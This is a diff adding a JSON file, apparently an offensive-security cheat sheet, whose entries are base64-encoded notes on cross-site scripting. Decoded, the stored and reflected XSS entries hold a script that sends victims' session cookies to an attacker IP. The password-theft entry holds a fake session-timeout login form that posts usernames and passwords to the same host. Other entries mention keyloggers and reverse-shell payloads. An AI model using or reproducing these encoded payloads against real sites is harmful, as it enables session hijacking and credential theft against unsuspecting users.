@@ -1,0 +1,36 @@
+{
+    "command": {
+        "xss_use_cases": {
+            "description": "Use cases for XSS",
+            "commands": [
+                "MS4gQWNjb3VudCBIaWphY2tpbmcgLSBzdGVhbCBzZXNzaW9uIGNvb2tpZXMgdmlhIEltYWdlIG1ldGhvZCBiZWxvdywgb3Igb3RoZXIgbWV0aG9kCjIuIFBhc3N3b3JkIFRoZWZ0IC0gU2VlIHBhc3N3b3JkIHRoZWZ0IGV4YW1wbGUgYXQgdGhlIGJvdHRvbQozLiBVbmF1dGhvcml6ZWQgQWN0aW9uIC0gaWYgYSB1c2VyIGhhcyBrbm93bGVkZ2Ugb2Ygb3RoZXIgZnVuY3Rpb25zIGluIGphdmFzY3JpcHQgdGhhdCBjYW4gYmUgcGVyZm9ybWVkIG9ubHkgYnkgYW4gYXV0aG9yaXplZCB1c2VyLCB0aG9zZSBhY3Rpb25zIGNhbiBiZSB0YWtlbi9tYW5pcHVsYXRlZCB0byBzZW5kIHNlbnNpdGl2ZSBkYXRhIHRvIHRoZSBhdHRhY2tlciwgb3IgcGVyZm9ybSBhY3Rpb25zIG9uIGJlaGFsZiBvZiB0aGUgdXNlci4gCjQuIERvd25sb2FkIHBsdWdpbnMgLSBCZUVGIGFuZCBPV0FTUCBYZW5vdGl4IFhTUyBjYW4gYmUgdXNlZCB0byBjcmVhdGUgcGF5bG9hZHMgZm9yIHJldmVyc2Ugc2hlbGxzIHRoYXQgaWYgdGhlIHVzZXIgY2xpY2tzIHRvICdhbGxvdyBwbHVnaW4nLCBpdCBjYW4gZXhlY3V0ZS4KNS4gS2V5bG9nZ2VyIC0gdGhlcmUgaXMgYSBqYXZhc2NyaXB0IG1ldGFzcGxvaXQgbW9kdWxlIGZvciBrZXlsb2dnaW5nLCB0aGF0IGlzIFhTUyBkcml2ZW4uIA=="
+            ]
+        },
+        "stored_xss": {
+            "description": "Stored XSS discussion/example",
+            "commands": [
+                "I1N0b3JlZC9wZXJzaXN0ZW50IGV4Y2VycHQgdGhhdCBjb3VsZCBiZSB1c2VkIGZvciBjb21tZW50IGJvYXJkIG9yIHNvbWV0aGluZzoKPHNjcmlwdD5uZXcgSW1hZ2UoKS5zcmM9Imh0dHA6Ly8xMC4xMS4wLjEyNS9ib2d1cy5waHA/b3V0cHV0PSIrZG9jdW1lbnQuY29va2llOzwvc2NyaXB0PgojVmljdGltIGJyb3dzZXMgdG8gdGhlIHNpdGUgdGhhdCBoYXMgWFNTIHN0b3JlZCBvbiB0aGUgc2VydmVyLCBhbmQgdGhlIGphdmFzY3JpcHQgaXMgZXhlY3V0ZWQgaW4gdGhlIEJST1dTRVIsIGFuZCB0aGUgY29va2llIGlzIHRyYW5zZmVycmVkIHRvIHRoZSBhdHRhY2tlciBmcm9tIHRoZSBWaWN0aW0gbWFjaGluZQo="
+            ]
+        },
+        "reflected_xss": {
+            "description": "Example of reflected XSS",
+            "commands": [
+                "QXR0YWNrZXI6ICJIZXJlIGNsaWNrIG9uIHRoaXM6IiBodHRwOi8vc29tZXRoaW5nLmNvbS9zb21lcGFnZS5waHA/aWQ9PHNjcmlwdD5uZXcgSW1hZ2UoKS5zcmM9Imh0dHA6Ly8xMC4xMS4wLjEyNS9ib2d1cy5waHA/b3V0cHV0PSIrZG9jdW1lbnQuY29va2llOzwvc2NyaXB0PgpUaGVuIGF0dGFja2VyIGhhcyBzZXNzaW9uIElELg=="
+            ]
+        },
+        "dom_based_xss": {
+            "description": "DOM based XSS discussion/examples",
+            "commands": [
+                "QSBsaXR0bGUgbW9yZSBjb21wbGljYXRlZCwga2luZCBvZiBsaWtlIGEgY3Jvc3MgYmV0d2VlbiB0aGUgdHdvLiBTZXJ2ZXIgbG9hZHMgcGFnZSBmb3IgdXNlciwgcGFnZSBoYXMgcmVmZXJlbmNlcyB0byBET00gZWxlbWVudHMKbm90IGNvbnRhaW5lZC9wYXNzZWQgdG8vYXNzb2NpYXRlZCB3aXRoIHRoZSBzZXJ2ZXIsIGFuZCB0aGUgVVJMIGNhbiBjb250YWluIGVsZW1lbnRzIHRoYXQgbW9kaWZ5IHRoYXQgRE9NIGVsZW1lbnQuIApSZWZlcmVuY2U6IGh0dHBzOi8vd3d3Lm93YXNwLm9yZy9pbmRleC5waHAvVGVzdGluZ19mb3JfRE9NLWJhc2VkX0Nyb3NzX3NpdGVfc2NyaXB0aW5nXyhPVEctQ0xJRU5ULTAwMSkKCkRPTSBleGFtcGxlIFNlcnZlciBTaWRlIENvZGU6CjxzY3JpcHQ+CmRvY3VtZW50LndyaXRlKCJTaXRlIGlzIGF0OiAiICsgZG9jdW1lbnQubG9jYXRpb24uaHJlZiArICIuIik7Cjwvc2NyaXB0PgoKRE9NIGV4YW1wbGUgUmVxdWVzdDoKR0VUIGh0dHA6Ly9zb21lc2VydmVyLmNvbS9zb21lcGFnZS5waHA/aWQ9d2hhdGV2ZXIjPHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+CgpET00tQmFzZWQgbG9naWMgbm90ZSAmIHRlc3Rpbmc6IFRoZSBhYmlsaXR5IHRvIHRlc3QgbWF5IHJlbHkgb24gYSBudW1iZXIgb2YgZmFjdG9ycy4gSWYsIGZvciBpbnN0YW5jZSwgdGhlIHBhZ2UgY2hlY2tzIHdpdGggYW4gaWYvZWxzZQpzdGF0ZW1lbnQgdG8gY2hlY2sgdGhlIHVzZXIgYWdlbnQsIGFuZCBvbmUgb3V0Y29tZSBpbmNsdWRlcyBhICdsb2NhdGlvbi5ocmVmJyBhbmQgdGhlIG90aGVyIGRvZXMgbm90LCB5b3UgbWF5IG5vdCBkaXNjb3ZlciB0aGlzIGluIAp0ZXN0aW5nLCBkZXBlbmRpbmcgb24geW91ciB1c2VyIGFnZW50LiBTZWUgdGhpcyBleGFtcGxlIGNvZGUgb2YgdGhhdCBzaXR1YXRpb24sIGZyb20gdGhlIG93YXNwIHNpdGUgcmVmZXJlbmNlZCBhYm92ZToKCjxzY3JpcHQ+CnZhciBuYXZBZ3QgPSBuYXZpZ2F0b3IudXNlckFnZW50OwogCmlmIChuYXZBZ3QuaW5kZXhPZigiTVNJRSIpIT0tMSkgewogICAgIGRvY3VtZW50LndyaXRlKCJZb3UgYXJlIHVzaW5nIElFIGFzIGEgYnJvd3NlciBhbmQgdmlzaXRpbmcgc2l0ZTogIiArIGRvY3VtZW50LmxvY2F0aW9uLmhyZWYgKyAiLiIpOwp9CmVsc2UKewogICAgZG9jdW1lbnQud3JpdGUoIllvdSBhcmUgdXNpbmcgYW4gdW5rbm93biBicm93c2VyLiIpOwp9Cjwvc2NyaXB0Pgo="
+            ]
+        },
+        "password_theft_xss": {
+            "description": "Example of password theft in XSS",
+            "commands": [
+                "I0dvdCB0aGlzIGZyb20gaGVyZSAoY3JlZGl0KTogaHR0cHM6Ly93d3cuZGlvbmFjaC5jb20vYmxvZy90aGUtcmVhbC1pbXBhY3Qtb2YtY3Jvc3Mtc2l0ZS1zY3JpcHRpbmcKPGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7dG9wOjUwJTtsZWZ0OjUwJTttYXJnaW46IC0xMDBweCAwIDAgLTEwMHB4O2hlaWdodD0xMDBweDt3aWR0aD0xMDBweDt6LWluZGV4OjE7Ym9yZGVyLXdpZHRoOjFweDtib3JkZXItc3R5bGU6c29saWQ7IGJvcmRlci1jb2xvcjojRDNEM0QzIj4KICA8aDM+WW91ciBzZXNzaW9uIGhhcyB0aW1lZCBvdXQuPC9oMz4KICA8Zm9ybSBhY3Rpb249aHR0cDovLzEwLjExLjAuMTI1PgogICAgVXNlcm5hbWU6PGJyPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VyIj48YnI+CiAgICBQYXNzd29yZDo8YnI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIj48YnI+PGJyPgogICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ29uIj4KICA8L2Zvcm0+CjwvZGl2Pg=="
+            ]
+        }
+    },
+    "configuration": {
+    }
+}
